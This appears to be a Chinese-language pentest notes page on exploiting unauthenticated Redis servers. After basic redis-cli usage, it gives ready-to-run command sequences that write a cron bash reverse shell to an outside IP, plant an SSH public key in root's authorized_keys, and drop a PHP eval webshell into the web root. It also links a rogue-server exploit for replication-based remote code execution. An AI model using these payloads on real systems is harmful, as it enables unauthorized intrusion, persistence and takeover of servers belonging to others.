# Redis客户端

```
sudo apt update
sudo apt install redis-tools
---
gui
https://github.com/qishibo/AnotherRedisDesktopManager

redis-cli -h 127.0.0.1
```

![](https://img.mi3aka.eu.org/2022/08/a1244184910709658599795a50317189.png)

`redis-cli -h your_host -p 6379 -a "pass" --raw`

`-h` 远程连接的主机

`-p` 远程连接的端口

`-a` 密码

`--raw` 解决中文乱码

# 计划任务反弹shell

```
#反弹shell
set getshell "\n* * * * * bash -i >& /dev/tcp/ip/7000 0>&1\n"
#计划任务路径 ubuntu/debian
config set dir /etc/cron.d
#保存为test文件
config set dbfilename test
#保存
save
```

![](https://img.mi3aka.eu.org/2022/08/8fbe7a6b8aeabf44cd824d24412030fb.png)

![](https://img.mi3aka.eu.org/2022/08/f7263ca7275e6ad8b8fa62877ef8bdba.png)

![](https://img.mi3aka.eu.org/2022/08/e75f82a956bdf1bc2b90f1904ecead3e.png)

>无法正常反弹原因

计划任务中存在乱码，也就是这些乱码导致计划任务执行错误。
这是由于redis向任务计划文件里写内容出现乱码而导致的语法错误，而乱码是避免不了的，centos会忽略乱码去执行格式正确的任务计划，而ubuntu并不会忽略这些乱码，所以导致命令执行失败，因为自己如果不使用redis写任务计划文件，而是正常向/etc/cron.d目录下写任务计划文件的话，命令是可以正常执行的，所以还是乱码的原因导致命令不能正常执行，而这个问题是不能解决的，因为利用redis未授权访问写的任务计划文件里都有乱码，这些代码来自redis的缓存数据。

# 写入ssh公钥

```
set sshpubkey "\n\nssh-rsa AAAAB3Nzaxxx\n\n"

config set dir /root/.ssh

config set dbfilename authorized_keys

save
```

![](https://img.mi3aka.eu.org/2022/08/cb1a6d3734c8f4506001219f2b49c775.png)

![](https://img.mi3aka.eu.org/2022/08/b835023633794da2ed81ddb461e8ae69.png)

# 写入webshell

```
config set dir /var/www/html/
config set dbfilename webshell.php
set x '<?php @eval($_GET["cmd"]);phpinfo();?>'
save
```

# Redis主从复制导致的命令执行

影响版本4.x-5.x

1. 直接使用exp

https://github.com/n0b0dyCN/redis-rogue-server

2. 本地利用Redis主从复制RCE

# Redis Lua沙盒绕过命令执行

>todo